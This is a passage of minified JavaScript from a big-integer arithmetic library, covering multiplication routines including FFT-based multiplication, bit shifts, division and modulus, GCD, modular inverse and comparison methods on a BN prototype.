                        (mid = ((mid = Math.imul(al9, bh3)) + Math.imul(ah9, bl3)) | 0),
                        (hi = Math.imul(ah9, bh3)),
                        (lo = (lo + Math.imul(al8, bl4)) | 0),
                        (mid = ((mid = (mid + Math.imul(al8, bh4)) | 0) + Math.imul(ah8, bl4)) | 0),
                        (hi = (hi + Math.imul(ah8, bh4)) | 0),
                        (lo = (lo + Math.imul(al7, bl5)) | 0),
                        (mid = ((mid = (mid + Math.imul(al7, bh5)) | 0) + Math.imul(ah7, bl5)) | 0),
                        (hi = (hi + Math.imul(ah7, bh5)) | 0),
                        (lo = (lo + Math.imul(al6, bl6)) | 0),
                        (mid = ((mid = (mid + Math.imul(al6, bh6)) | 0) + Math.imul(ah6, bl6)) | 0),
                        (hi = (hi + Math.imul(ah6, bh6)) | 0),
                        (lo = (lo + Math.imul(al5, bl7)) | 0),
                        (mid = ((mid = (mid + Math.imul(al5, bh7)) | 0) + Math.imul(ah5, bl7)) | 0),
                        (hi = (hi + Math.imul(ah5, bh7)) | 0),
                        (lo = (lo + Math.imul(al4, bl8)) | 0),
                        (mid = ((mid = (mid + Math.imul(al4, bh8)) | 0) + Math.imul(ah4, bl8)) | 0),
                        (hi = (hi + Math.imul(ah4, bh8)) | 0);
                    var w12 = (((c + (lo = (lo + Math.imul(al3, bl9)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al3, bh9)) | 0) + Math.imul(ah3, bl9)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah3, bh9)) | 0) + (mid >>> 13)) | 0) + (w12 >>> 26)) | 0),
                        (w12 &= 67108863),
                        (lo = Math.imul(al9, bl4)),
                        (mid = ((mid = Math.imul(al9, bh4)) + Math.imul(ah9, bl4)) | 0),
                        (hi = Math.imul(ah9, bh4)),
                        (lo = (lo + Math.imul(al8, bl5)) | 0),
                        (mid = ((mid = (mid + Math.imul(al8, bh5)) | 0) + Math.imul(ah8, bl5)) | 0),
                        (hi = (hi + Math.imul(ah8, bh5)) | 0),
                        (lo = (lo + Math.imul(al7, bl6)) | 0),
                        (mid = ((mid = (mid + Math.imul(al7, bh6)) | 0) + Math.imul(ah7, bl6)) | 0),
                        (hi = (hi + Math.imul(ah7, bh6)) | 0),
                        (lo = (lo + Math.imul(al6, bl7)) | 0),
                        (mid = ((mid = (mid + Math.imul(al6, bh7)) | 0) + Math.imul(ah6, bl7)) | 0),
                        (hi = (hi + Math.imul(ah6, bh7)) | 0),
                        (lo = (lo + Math.imul(al5, bl8)) | 0),
                        (mid = ((mid = (mid + Math.imul(al5, bh8)) | 0) + Math.imul(ah5, bl8)) | 0),
                        (hi = (hi + Math.imul(ah5, bh8)) | 0);
                    var w13 = (((c + (lo = (lo + Math.imul(al4, bl9)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al4, bh9)) | 0) + Math.imul(ah4, bl9)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah4, bh9)) | 0) + (mid >>> 13)) | 0) + (w13 >>> 26)) | 0),
                        (w13 &= 67108863),
                        (lo = Math.imul(al9, bl5)),
                        (mid = ((mid = Math.imul(al9, bh5)) + Math.imul(ah9, bl5)) | 0),
                        (hi = Math.imul(ah9, bh5)),
                        (lo = (lo + Math.imul(al8, bl6)) | 0),
                        (mid = ((mid = (mid + Math.imul(al8, bh6)) | 0) + Math.imul(ah8, bl6)) | 0),
                        (hi = (hi + Math.imul(ah8, bh6)) | 0),
                        (lo = (lo + Math.imul(al7, bl7)) | 0),
                        (mid = ((mid = (mid + Math.imul(al7, bh7)) | 0) + Math.imul(ah7, bl7)) | 0),
                        (hi = (hi + Math.imul(ah7, bh7)) | 0),
                        (lo = (lo + Math.imul(al6, bl8)) | 0),
                        (mid = ((mid = (mid + Math.imul(al6, bh8)) | 0) + Math.imul(ah6, bl8)) | 0),
                        (hi = (hi + Math.imul(ah6, bh8)) | 0);
                    var w14 = (((c + (lo = (lo + Math.imul(al5, bl9)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al5, bh9)) | 0) + Math.imul(ah5, bl9)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah5, bh9)) | 0) + (mid >>> 13)) | 0) + (w14 >>> 26)) | 0),
                        (w14 &= 67108863),
                        (lo = Math.imul(al9, bl6)),
                        (mid = ((mid = Math.imul(al9, bh6)) + Math.imul(ah9, bl6)) | 0),
                        (hi = Math.imul(ah9, bh6)),
                        (lo = (lo + Math.imul(al8, bl7)) | 0),
                        (mid = ((mid = (mid + Math.imul(al8, bh7)) | 0) + Math.imul(ah8, bl7)) | 0),
                        (hi = (hi + Math.imul(ah8, bh7)) | 0),
                        (lo = (lo + Math.imul(al7, bl8)) | 0),
                        (mid = ((mid = (mid + Math.imul(al7, bh8)) | 0) + Math.imul(ah7, bl8)) | 0),
                        (hi = (hi + Math.imul(ah7, bh8)) | 0);
                    var w15 = (((c + (lo = (lo + Math.imul(al6, bl9)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al6, bh9)) | 0) + Math.imul(ah6, bl9)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah6, bh9)) | 0) + (mid >>> 13)) | 0) + (w15 >>> 26)) | 0),
                        (w15 &= 67108863),
                        (lo = Math.imul(al9, bl7)),
                        (mid = ((mid = Math.imul(al9, bh7)) + Math.imul(ah9, bl7)) | 0),
                        (hi = Math.imul(ah9, bh7)),
                        (lo = (lo + Math.imul(al8, bl8)) | 0),
                        (mid = ((mid = (mid + Math.imul(al8, bh8)) | 0) + Math.imul(ah8, bl8)) | 0),
                        (hi = (hi + Math.imul(ah8, bh8)) | 0);
                    var w16 = (((c + (lo = (lo + Math.imul(al7, bl9)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al7, bh9)) | 0) + Math.imul(ah7, bl9)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah7, bh9)) | 0) + (mid >>> 13)) | 0) + (w16 >>> 26)) | 0),
                        (w16 &= 67108863),
                        (lo = Math.imul(al9, bl8)),
                        (mid = ((mid = Math.imul(al9, bh8)) + Math.imul(ah9, bl8)) | 0),
                        (hi = Math.imul(ah9, bh8));
                    var w17 = (((c + (lo = (lo + Math.imul(al8, bl9)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al8, bh9)) | 0) + Math.imul(ah8, bl9)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah8, bh9)) | 0) + (mid >>> 13)) | 0) + (w17 >>> 26)) | 0), (w17 &= 67108863);
                    var w18 = (((c + (lo = Math.imul(al9, bl9))) | 0) + ((8191 & (mid = ((mid = Math.imul(al9, bh9)) + Math.imul(ah9, bl9)) | 0)) << 13)) | 0;
                    return (
                        (c = ((((hi = Math.imul(ah9, bh9)) + (mid >>> 13)) | 0) + (w18 >>> 26)) | 0),
                        (w18 &= 67108863),
                        (o[0] = w0),
                        (o[1] = w1),
                        (o[2] = w2),
                        (o[3] = w3),
                        (o[4] = w4),
                        (o[5] = w5),
                        (o[6] = w6),
                        (o[7] = w7),
                        (o[8] = w8),
                        (o[9] = w9),
                        (o[10] = w10),
                        (o[11] = w11),
                        (o[12] = w12),
                        (o[13] = w13),
                        (o[14] = w14),
                        (o[15] = w15),
                        (o[16] = w16),
                        (o[17] = w17),
                        (o[18] = w18),
                        0 !== c && ((o[19] = c), out.length++),
                        out
                    );
                };
                function bigMulTo(self, num, out) {
                    (out.negative = num.negative ^ self.negative), (out.length = self.length + num.length);
                    for (var carry = 0, hncarry = 0, k = 0; k < out.length - 1; k++) {
                        var ncarry = hncarry;
                        hncarry = 0;
                        for (var rword = 67108863 & carry, maxJ = Math.min(k, num.length - 1), j = Math.max(0, k - self.length + 1); j <= maxJ; j++) {
                            var i = k - j,
                                r = (0 | self.words[i]) * (0 | num.words[j]),
                                lo = 67108863 & r;
                            (rword = 67108863 & (lo = (lo + rword) | 0)), (hncarry += (ncarry = ((ncarry = (ncarry + ((r / 67108864) | 0)) | 0) + (lo >>> 26)) | 0) >>> 26), (ncarry &= 67108863);
                        }
                        (out.words[k] = rword), (carry = ncarry), (ncarry = hncarry);
                    }
                    return 0 !== carry ? (out.words[k] = carry) : out.length--, out._strip();
                }
                function jumboMulTo(self, num, out) {
                    return bigMulTo(self, num, out);
                }
                function FFTM(x, y) {
                    (this.x = x), (this.y = y);
                }
                Math.imul || (comb10MulTo = smallMulTo),
                    (BN.prototype.mulTo = function (num, out) {
                        var len = this.length + num.length;
                        return 10 === this.length && 10 === num.length ? comb10MulTo(this, num, out) : len < 63 ? smallMulTo(this, num, out) : len < 1024 ? bigMulTo(this, num, out) : jumboMulTo(this, num, out);
                    }),
                    (FFTM.prototype.makeRBT = function (N) {
                        for (var t = new Array(N), l = BN.prototype._countBits(N) - 1, i = 0; i < N; i++) t[i] = this.revBin(i, l, N);
                        return t;
                    }),
                    (FFTM.prototype.revBin = function (x, l, N) {
                        if (0 === x || x === N - 1) return x;
                        for (var rb = 0, i = 0; i < l; i++) (rb |= (1 & x) << (l - i - 1)), (x >>= 1);
                        return rb;
                    }),
                    (FFTM.prototype.permute = function (rbt, rws, iws, rtws, itws, N) {
                        for (var i = 0; i < N; i++) (rtws[i] = rws[rbt[i]]), (itws[i] = iws[rbt[i]]);
                    }),
                    (FFTM.prototype.transform = function (rws, iws, rtws, itws, N, rbt) {
                        this.permute(rbt, rws, iws, rtws, itws, N);
                        for (var s = 1; s < N; s <<= 1)
                            for (var l = s << 1, rtwdf = Math.cos((2 * Math.PI) / l), itwdf = Math.sin((2 * Math.PI) / l), p = 0; p < N; p += l)
                                for (var rtwdf_ = rtwdf, itwdf_ = itwdf, j = 0; j < s; j++) {
                                    var re = rtws[p + j],
                                        ie = itws[p + j],
                                        ro = rtws[p + j + s],
                                        io = itws[p + j + s],
                                        rx = rtwdf_ * ro - itwdf_ * io;
                                    (io = rtwdf_ * io + itwdf_ * ro),
                                        (ro = rx),
                                        (rtws[p + j] = re + ro),
                                        (itws[p + j] = ie + io),
                                        (rtws[p + j + s] = re - ro),
                                        (itws[p + j + s] = ie - io),
                                        j !== l && ((rx = rtwdf * rtwdf_ - itwdf * itwdf_), (itwdf_ = rtwdf * itwdf_ + itwdf * rtwdf_), (rtwdf_ = rx));
                                }
                    }),
                    (FFTM.prototype.guessLen13b = function (n, m) {
                        var N = 1 | Math.max(m, n),
                            odd = 1 & N,
                            i = 0;
                        for (N = (N / 2) | 0; N; N >>>= 1) i++;
                        return 1 << (i + 1 + odd);
                    }),
                    (FFTM.prototype.conjugate = function (rws, iws, N) {
                        if (!(N <= 1))
                            for (var i = 0; i < N / 2; i++) {
                                var t = rws[i];
                                (rws[i] = rws[N - i - 1]), (rws[N - i - 1] = t), (t = iws[i]), (iws[i] = -iws[N - i - 1]), (iws[N - i - 1] = -t);
                            }
                    }),
                    (FFTM.prototype.normalize13b = function (ws, N) {
                        for (var carry = 0, i = 0; i < N / 2; i++) {
                            var w = 8192 * Math.round(ws[2 * i + 1] / N) + Math.round(ws[2 * i] / N) + carry;
                            (ws[i] = 67108863 & w), (carry = w < 67108864 ? 0 : (w / 67108864) | 0);
                        }
                        return ws;
                    }),
                    (FFTM.prototype.convert13b = function (ws, len, rws, N) {
                        for (var carry = 0, i = 0; i < len; i++) (carry += 0 | ws[i]), (rws[2 * i] = 8191 & carry), (carry >>>= 13), (rws[2 * i + 1] = 8191 & carry), (carry >>>= 13);
                        for (i = 2 * len; i < N; ++i) rws[i] = 0;
                        assert(0 === carry), assert(0 == (-8192 & carry));
                    }),
                    (FFTM.prototype.stub = function (N) {
                        for (var ph = new Array(N), i = 0; i < N; i++) ph[i] = 0;
                        return ph;
                    }),
                    (FFTM.prototype.mulp = function (x, y, out) {
                        var N = 2 * this.guessLen13b(x.length, y.length),
                            rbt = this.makeRBT(N),
                            _ = this.stub(N),
                            rws = new Array(N),
                            rwst = new Array(N),
                            iwst = new Array(N),
                            nrws = new Array(N),
                            nrwst = new Array(N),
                            niwst = new Array(N),
                            rmws = out.words;
                        (rmws.length = N), this.convert13b(x.words, x.length, rws, N), this.convert13b(y.words, y.length, nrws, N), this.transform(rws, _, rwst, iwst, N, rbt), this.transform(nrws, _, nrwst, niwst, N, rbt);
                        for (var i = 0; i < N; i++) {
                            var rx = rwst[i] * nrwst[i] - iwst[i] * niwst[i];
                            (iwst[i] = rwst[i] * niwst[i] + iwst[i] * nrwst[i]), (rwst[i] = rx);
                        }
                        return (
                            this.conjugate(rwst, iwst, N),
                            this.transform(rwst, iwst, rmws, _, N, rbt),
                            this.conjugate(rmws, _, N),
                            this.normalize13b(rmws, N),
                            (out.negative = x.negative ^ y.negative),
                            (out.length = x.length + y.length),
                            out._strip()
                        );
                    }),
                    (BN.prototype.mul = function (num) {
                        var out = new BN(null);
                        return (out.words = new Array(this.length + num.length)), this.mulTo(num, out);
                    }),
                    (BN.prototype.mulf = function (num) {
                        var out = new BN(null);
                        return (out.words = new Array(this.length + num.length)), jumboMulTo(this, num, out);
                    }),
                    (BN.prototype.imul = function (num) {
                        return this.clone().mulTo(num, this);
                    }),
                    (BN.prototype.imuln = function (num) {
                        var isNegNum = num < 0;
                        isNegNum && (num = -num), assert("number" == typeof num), assert(num < 67108864);
                        for (var carry = 0, i = 0; i < this.length; i++) {
                            var w = (0 | this.words[i]) * num,
                                lo = (67108863 & w) + (67108863 & carry);
                            (carry >>= 26), (carry += (w / 67108864) | 0), (carry += lo >>> 26), (this.words[i] = 67108863 & lo);
                        }
                        return 0 !== carry && ((this.words[i] = carry), this.length++), isNegNum ? this.ineg() : this;
                    }),
                    (BN.prototype.muln = function (num) {
                        return this.clone().imuln(num);
                    }),
                    (BN.prototype.sqr = function () {
                        return this.mul(this);
                    }),
                    (BN.prototype.isqr = function () {
                        return this.imul(this.clone());
                    }),
                    (BN.prototype.pow = function (num) {
                        var w = (function (num) {
                            for (var w = new Array(num.bitLength()), bit = 0; bit < w.length; bit++) {
                                var off = (bit / 26) | 0,
                                    wbit = bit % 26;
                                w[bit] = (num.words[off] >>> wbit) & 1;
                            }
                            return w;
                        })(num);
                        if (0 === w.length) return new BN(1);
                        for (var res = this, i = 0; i < w.length && 0 === w[i]; i++, res = res.sqr());
                        if (++i < w.length) for (var q = res.sqr(); i < w.length; i++, q = q.sqr()) 0 !== w[i] && (res = res.mul(q));
                        return res;
                    }),
                    (BN.prototype.iushln = function (bits) {
                        assert("number" == typeof bits && bits >= 0);
                        var i,
                            r = bits % 26,
                            s = (bits - r) / 26,
                            carryMask = (67108863 >>> (26 - r)) << (26 - r);
                        if (0 !== r) {
                            var carry = 0;
                            for (i = 0; i < this.length; i++) {
                                var newCarry = this.words[i] & carryMask,
                                    c = ((0 | this.words[i]) - newCarry) << r;
                                (this.words[i] = c | carry), (carry = newCarry >>> (26 - r));
                            }
                            carry && ((this.words[i] = carry), this.length++);
                        }
                        if (0 !== s) {
                            for (i = this.length - 1; i >= 0; i--) this.words[i + s] = this.words[i];
                            for (i = 0; i < s; i++) this.words[i] = 0;
                            this.length += s;
                        }
                        return this._strip();
                    }),
                    (BN.prototype.ishln = function (bits) {
                        return assert(0 === this.negative), this.iushln(bits);
                    }),
                    (BN.prototype.iushrn = function (bits, hint, extended) {
                        var h;
                        assert("number" == typeof bits && bits >= 0), (h = hint ? (hint - (hint % 26)) / 26 : 0);
                        var r = bits % 26,
                            s = Math.min((bits - r) / 26, this.length),
                            mask = 67108863 ^ ((67108863 >>> r) << r),
                            maskedWords = extended;
                        if (((h -= s), (h = Math.max(0, h)), maskedWords)) {
                            for (var i = 0; i < s; i++) maskedWords.words[i] = this.words[i];
                            maskedWords.length = s;
                        }
                        if (0 === s);
                        else if (this.length > s) for (this.length -= s, i = 0; i < this.length; i++) this.words[i] = this.words[i + s];
                        else (this.words[0] = 0), (this.length = 1);
                        var carry = 0;
                        for (i = this.length - 1; i >= 0 && (0 !== carry || i >= h); i--) {
                            var word = 0 | this.words[i];
                            (this.words[i] = (carry << (26 - r)) | (word >>> r)), (carry = word & mask);
                        }
                        return maskedWords && 0 !== carry && (maskedWords.words[maskedWords.length++] = carry), 0 === this.length && ((this.words[0] = 0), (this.length = 1)), this._strip();
                    }),
                    (BN.prototype.ishrn = function (bits, hint, extended) {
                        return assert(0 === this.negative), this.iushrn(bits, hint, extended);
                    }),
                    (BN.prototype.shln = function (bits) {
                        return this.clone().ishln(bits);
                    }),
                    (BN.prototype.ushln = function (bits) {
                        return this.clone().iushln(bits);
                    }),
                    (BN.prototype.shrn = function (bits) {
                        return this.clone().ishrn(bits);
                    }),
                    (BN.prototype.ushrn = function (bits) {
                        return this.clone().iushrn(bits);
                    }),
                    (BN.prototype.testn = function (bit) {
                        assert("number" == typeof bit && bit >= 0);
                        var r = bit % 26,
                            s = (bit - r) / 26,
                            q = 1 << r;
                        return !(this.length <= s) && !!(this.words[s] & q);
                    }),
                    (BN.prototype.imaskn = function (bits) {
                        assert("number" == typeof bits && bits >= 0);
                        var r = bits % 26,
                            s = (bits - r) / 26;
                        if ((assert(0 === this.negative, "imaskn works only with positive numbers"), this.length <= s)) return this;
                        if ((0 !== r && s++, (this.length = Math.min(s, this.length)), 0 !== r)) {
                            var mask = 67108863 ^ ((67108863 >>> r) << r);
                            this.words[this.length - 1] &= mask;
                        }
                        return this._strip();
                    }),
                    (BN.prototype.maskn = function (bits) {
                        return this.clone().imaskn(bits);
                    }),
                    (BN.prototype.iaddn = function (num) {
                        return (
                            assert("number" == typeof num),
                            assert(num < 67108864),
                            num < 0
                                ? this.isubn(-num)
                                : 0 !== this.negative
                                ? 1 === this.length && (0 | this.words[0]) <= num
                                    ? ((this.words[0] = num - (0 | this.words[0])), (this.negative = 0), this)
                                    : ((this.negative = 0), this.isubn(num), (this.negative = 1), this)
                                : this._iaddn(num)
                        );
                    }),
                    (BN.prototype._iaddn = function (num) {
                        this.words[0] += num;
                        for (var i = 0; i < this.length && this.words[i] >= 67108864; i++) (this.words[i] -= 67108864), i === this.length - 1 ? (this.words[i + 1] = 1) : this.words[i + 1]++;
                        return (this.length = Math.max(this.length, i + 1)), this;
                    }),
                    (BN.prototype.isubn = function (num) {
                        if ((assert("number" == typeof num), assert(num < 67108864), num < 0)) return this.iaddn(-num);
                        if (0 !== this.negative) return (this.negative = 0), this.iaddn(num), (this.negative = 1), this;
                        if (((this.words[0] -= num), 1 === this.length && this.words[0] < 0)) (this.words[0] = -this.words[0]), (this.negative = 1);
                        else for (var i = 0; i < this.length && this.words[i] < 0; i++) (this.words[i] += 67108864), (this.words[i + 1] -= 1);
                        return this._strip();
                    }),
                    (BN.prototype.addn = function (num) {
                        return this.clone().iaddn(num);
                    }),
                    (BN.prototype.subn = function (num) {
                        return this.clone().isubn(num);
                    }),
                    (BN.prototype.iabs = function () {
                        return (this.negative = 0), this;
                    }),
                    (BN.prototype.abs = function () {
                        return this.clone().iabs();
                    }),
                    (BN.prototype._ishlnsubmul = function (num, mul, shift) {
                        var i,
                            w,
                            len = num.length + shift;
                        this._expand(len);
                        var carry = 0;
                        for (i = 0; i < num.length; i++) {
                            w = (0 | this.words[i + shift]) + carry;
                            var right = (0 | num.words[i]) * mul;
                            (carry = ((w -= 67108863 & right) >> 26) - ((right / 67108864) | 0)), (this.words[i + shift] = 67108863 & w);
                        }
                        for (; i < this.length - shift; i++) (carry = (w = (0 | this.words[i + shift]) + carry) >> 26), (this.words[i + shift] = 67108863 & w);
                        if (0 === carry) return this._strip();
                        for (assert(-1 === carry), carry = 0, i = 0; i < this.length; i++) (carry = (w = -(0 | this.words[i]) + carry) >> 26), (this.words[i] = 67108863 & w);
                        return (this.negative = 1), this._strip();
                    }),
                    (BN.prototype._wordDiv = function (num, mode) {
                        var shift = (this.length, num.length),
                            a = this.clone(),
                            b = num,
                            bhi = 0 | b.words[b.length - 1];
                        0 !== (shift = 26 - this._countBits(bhi)) && ((b = b.ushln(shift)), a.iushln(shift), (bhi = 0 | b.words[b.length - 1]));
                        var q,
                            m = a.length - b.length;
                        if ("mod" !== mode) {
                            ((q = new BN(null)).length = m + 1), (q.words = new Array(q.length));
                            for (var i = 0; i < q.length; i++) q.words[i] = 0;
                        }
                        var diff = a.clone()._ishlnsubmul(b, 1, m);
                        0 === diff.negative && ((a = diff), q && (q.words[m] = 1));
                        for (var j = m - 1; j >= 0; j--) {
                            var qj = 67108864 * (0 | a.words[b.length + j]) + (0 | a.words[b.length + j - 1]);
                            for (qj = Math.min((qj / bhi) | 0, 67108863), a._ishlnsubmul(b, qj, j); 0 !== a.negative; ) qj--, (a.negative = 0), a._ishlnsubmul(b, 1, j), a.isZero() || (a.negative ^= 1);
                            q && (q.words[j] = qj);
                        }
                        return q && q._strip(), a._strip(), "div" !== mode && 0 !== shift && a.iushrn(shift), { div: q || null, mod: a };
                    }),
                    (BN.prototype.divmod = function (num, mode, positive) {
                        return (
                            assert(!num.isZero()),
                            this.isZero()
                                ? { div: new BN(0), mod: new BN(0) }
                                : 0 !== this.negative && 0 === num.negative
                                ? ((res = this.neg().divmod(num, mode)), "mod" !== mode && (div = res.div.neg()), "div" !== mode && ((mod = res.mod.neg()), positive && 0 !== mod.negative && mod.iadd(num)), { div: div, mod: mod })
                                : 0 === this.negative && 0 !== num.negative
                                ? ((res = this.divmod(num.neg(), mode)), "mod" !== mode && (div = res.div.neg()), { div: div, mod: res.mod })
                                : 0 != (this.negative & num.negative)
                                ? ((res = this.neg().divmod(num.neg(), mode)), "div" !== mode && ((mod = res.mod.neg()), positive && 0 !== mod.negative && mod.isub(num)), { div: res.div, mod: mod })
                                : num.length > this.length || this.cmp(num) < 0
                                ? { div: new BN(0), mod: this }
                                : 1 === num.length
                                ? "div" === mode
                                    ? { div: this.divn(num.words[0]), mod: null }
                                    : "mod" === mode
                                    ? { div: null, mod: new BN(this.modrn(num.words[0])) }
                                    : { div: this.divn(num.words[0]), mod: new BN(this.modrn(num.words[0])) }
                                : this._wordDiv(num, mode)
                        );
                        var div, mod, res;
                    }),
                    (BN.prototype.div = function (num) {
                        return this.divmod(num, "div", !1).div;
                    }),
                    (BN.prototype.mod = function (num) {
                        return this.divmod(num, "mod", !1).mod;
                    }),
                    (BN.prototype.umod = function (num) {
                        return this.divmod(num, "mod", !0).mod;
                    }),
                    (BN.prototype.divRound = function (num) {
                        var dm = this.divmod(num);
                        if (dm.mod.isZero()) return dm.div;
                        var mod = 0 !== dm.div.negative ? dm.mod.isub(num) : dm.mod,
                            half = num.ushrn(1),
                            r2 = num.andln(1),
                            cmp = mod.cmp(half);
                        return cmp < 0 || (1 === r2 && 0 === cmp) ? dm.div : 0 !== dm.div.negative ? dm.div.isubn(1) : dm.div.iaddn(1);
                    }),
                    (BN.prototype.modrn = function (num) {
                        var isNegNum = num < 0;
                        isNegNum && (num = -num), assert(num <= 67108863);
                        for (var p = (1 << 26) % num, acc = 0, i = this.length - 1; i >= 0; i--) acc = (p * acc + (0 | this.words[i])) % num;
                        return isNegNum ? -acc : acc;
                    }),
                    (BN.prototype.modn = function (num) {
                        return this.modrn(num);
                    }),
                    (BN.prototype.idivn = function (num) {
                        var isNegNum = num < 0;
                        isNegNum && (num = -num), assert(num <= 67108863);
                        for (var carry = 0, i = this.length - 1; i >= 0; i--) {
                            var w = (0 | this.words[i]) + 67108864 * carry;
                            (this.words[i] = (w / num) | 0), (carry = w % num);
                        }
                        return this._strip(), isNegNum ? this.ineg() : this;
                    }),
                    (BN.prototype.divn = function (num) {
                        return this.clone().idivn(num);
                    }),
                    (BN.prototype.egcd = function (p) {
                        assert(0 === p.negative), assert(!p.isZero());
                        var x = this,
                            y = p.clone();
                        x = 0 !== x.negative ? x.umod(p) : x.clone();
                        for (var A = new BN(1), B = new BN(0), C = new BN(0), D = new BN(1), g = 0; x.isEven() && y.isEven(); ) x.iushrn(1), y.iushrn(1), ++g;
                        for (var yp = y.clone(), xp = x.clone(); !x.isZero(); ) {
                            for (var i = 0, im = 1; 0 == (x.words[0] & im) && i < 26; ++i, im <<= 1);
                            if (i > 0) for (x.iushrn(i); i-- > 0; ) (A.isOdd() || B.isOdd()) && (A.iadd(yp), B.isub(xp)), A.iushrn(1), B.iushrn(1);
                            for (var j = 0, jm = 1; 0 == (y.words[0] & jm) && j < 26; ++j, jm <<= 1);
                            if (j > 0) for (y.iushrn(j); j-- > 0; ) (C.isOdd() || D.isOdd()) && (C.iadd(yp), D.isub(xp)), C.iushrn(1), D.iushrn(1);
                            x.cmp(y) >= 0 ? (x.isub(y), A.isub(C), B.isub(D)) : (y.isub(x), C.isub(A), D.isub(B));
                        }
                        return { a: C, b: D, gcd: y.iushln(g) };
                    }),
                    (BN.prototype._invmp = function (p) {
                        assert(0 === p.negative), assert(!p.isZero());
                        var a = this,
                            b = p.clone();
                        a = 0 !== a.negative ? a.umod(p) : a.clone();
                        for (var res, x1 = new BN(1), x2 = new BN(0), delta = b.clone(); a.cmpn(1) > 0 && b.cmpn(1) > 0; ) {
                            for (var i = 0, im = 1; 0 == (a.words[0] & im) && i < 26; ++i, im <<= 1);
                            if (i > 0) for (a.iushrn(i); i-- > 0; ) x1.isOdd() && x1.iadd(delta), x1.iushrn(1);
                            for (var j = 0, jm = 1; 0 == (b.words[0] & jm) && j < 26; ++j, jm <<= 1);
                            if (j > 0) for (b.iushrn(j); j-- > 0; ) x2.isOdd() && x2.iadd(delta), x2.iushrn(1);
                            a.cmp(b) >= 0 ? (a.isub(b), x1.isub(x2)) : (b.isub(a), x2.isub(x1));
                        }
                        return (res = 0 === a.cmpn(1) ? x1 : x2).cmpn(0) < 0 && res.iadd(p), res;
                    }),
                    (BN.prototype.gcd = function (num) {
                        if (this.isZero()) return num.abs();
                        if (num.isZero()) return this.abs();
                        var a = this.clone(),
                            b = num.clone();
                        (a.negative = 0), (b.negative = 0);
                        for (var shift = 0; a.isEven() && b.isEven(); shift++) a.iushrn(1), b.iushrn(1);
                        for (;;) {
                            for (; a.isEven(); ) a.iushrn(1);
                            for (; b.isEven(); ) b.iushrn(1);
                            var r = a.cmp(b);
                            if (r < 0) {
                                var t = a;
                                (a = b), (b = t);
                            } else if (0 === r || 0 === b.cmpn(1)) break;
                            a.isub(b);
                        }
                        return b.iushln(shift);
                    }),
                    (BN.prototype.invm = function (num) {
                        return this.egcd(num).a.umod(num);
                    }),
                    (BN.prototype.isEven = function () {
                        return 0 == (1 & this.words[0]);
                    }),
                    (BN.prototype.isOdd = function () {
                        return 1 == (1 & this.words[0]);
                    }),
                    (BN.prototype.andln = function (num) {
                        return this.words[0] & num;
                    }),
                    (BN.prototype.bincn = function (bit) {
                        assert("number" == typeof bit);
                        var r = bit % 26,
                            s = (bit - r) / 26,
                            q = 1 << r;
                        if (this.length <= s) return this._expand(s + 1), (this.words[s] |= q), this;
                        for (var carry = q, i = s; 0 !== carry && i < this.length; i++) {
                            var w = 0 | this.words[i];
                            (carry = (w += carry) >>> 26), (w &= 67108863), (this.words[i] = w);
                        }
                        return 0 !== carry && ((this.words[i] = carry), this.length++), this;
                    }),
                    (BN.prototype.isZero = function () {
                        return 1 === this.length && 0 === this.words[0];
                    }),
                    (BN.prototype.cmpn = function (num) {
                        var res,
                            negative = num < 0;
                        if (0 !== this.negative && !negative) return -1;
                        if (0 === this.negative && negative) return 1;
                        if ((this._strip(), this.length > 1)) res = 1;
                        else {
                            negative && (num = -num), assert(num <= 67108863, "Number is too big");
                            var w = 0 | this.words[0];
                            res = w === num ? 0 : w < num ? -1 : 1;
                        }
                        return 0 !== this.negative ? 0 | -res : res;
                    }),
                    (BN.prototype.cmp = function (num) {
                        if (0 !== this.negative && 0 === num.negative) return -1;
                        if (0 === this.negative && 0 !== num.negative) return 1;
                        var res = this.ucmp(num);
                        return 0 !== this.negative ? 0 | -res : res;
                    }),
                    (BN.prototype.ucmp = function (num) {
                        if (this.length > num.length) return 1;
                        if (this.length < num.length) return -1;
                        for (var res = 0, i = this.length - 1; i >= 0; i--) {
                            var a = 0 | this.words[i],
                                b = 0 | num.words[i];
                            if (a !== b) {
                                a < b ? (res = -1) : a > b && (res = 1);
                                break;
                            }
                        }
                        return res;
                    }),
                    (BN.prototype.gtn = function (num) {
                        return 1 === this.cmpn(num);
                    }),
                    (BN.prototype.gt = function (num) {
                        return 1 === this.cmp(num);
                    }),
                    (BN.prototype.gten = function (num) {
                        return this.cmpn(num) >= 0;
                    }),
                    (BN.prototype.gte = function (num) {
                        return this.cmp(num) >= 0;
                    }),
                    (BN.prototype.ltn = function (num) {
                        return -1 === this.cmpn(num);
                    }),
                    (BN.prototype.lt = function (num) {
                        return -1 === this.cmp(num);
                    }),
                    (BN.prototype.lten = function (num) {
                        return this.cmpn(num) <= 0;
                    }),
                    (BN.prototype.lte = function (num) {
                        return this.cmp(num) <= 0;
                    }),
                    (BN.prototype.eqn = function (num) {
                        return 0 === this.cmpn(num);
                    }),
                    (BN.prototype.eq = function (num) {
                        return 0 === this.cmp(num);
                    }),
                    (BN.red = function (num) {
                        return new Red(num);
                    }),
                    (BN.prototype.toRed = function (ctx) {
                        return assert(!this.red, "Already a number in reduction context"), assert(0 === this.negative, "red works only with positives"), ctx.convertTo(this)._forceRed(ctx);
                    }),
                    (BN.prototype.fromRed = function () {
                        return assert(this.red, "fromRed works only with numbers in reduction context"), this.red.convertFrom(this);
                    }),
                    (BN.prototype._forceRed = function (ctx) {
                        return (this.red = ctx), this;
                    }),
                    (BN.prototype.forceRed = function (ctx) {
                        return assert(!this.red, "Already a number in reduction context"), this._forceRed(ctx);
                    }),
                    (BN.prototype.redAdd = function (num) {
                        return assert(this.red, "redAdd works only with red numbers"), this.red.add(this, num);
                    }),
